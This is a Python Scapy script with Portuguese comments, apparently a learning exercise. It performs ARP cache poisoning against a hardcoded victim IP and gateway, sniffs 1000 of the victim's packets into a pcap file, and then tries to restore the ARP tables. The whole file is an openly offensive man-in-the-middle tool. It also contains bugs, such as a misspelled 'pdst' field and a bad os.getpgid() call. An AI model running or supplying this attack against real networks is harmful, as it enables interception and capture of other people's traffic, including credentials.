from socket import timeout
from scapy.all import *
import os
import sys
import threading
import signal


interface = "wlo1"
#lembrar de editar o parametro para receber o ip dinamicamente
target_ip = "192.168.31.232"
#lembrar de editar o parametro para receber o ip dinamicamente
gateway_ip = "192.168.30.9"
packet_count = 1000

print("[*] Setting up %s" % interface)


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    
    #um metodo um pouco diferente usando send
    print("[*] Restoring target...")
    send(ARP(op=2,psrc=gateway_ip,psdt=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2,psrc=target_ip,psdt=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

    #avisa a thread principal para terminar 
    os.kill(os.getpgid(), signal.SIGINT)

def get_mac(ip_address):

    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    #retorna o endereço MAC de uma resposta
    for s, r in responses:
        return r[Ether].src
    
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    
    print("[*] Benning the ARP poison. [CTRL -c to stop")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    
    print("[*] ARP poison attack finished")

    return

#define a nossa interface
conf.iface = interface

#desabilita a saída
conf.verb = 0

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" %(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

#inicia processo de envenenamento
poison_thread = threading.Thread(target= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))

poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    #grava os pacotes capturados
    wrpcap('arper.pcap',packets)

except KeyboardInterrupt:
    pass

finally:
    #restaura a rede
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
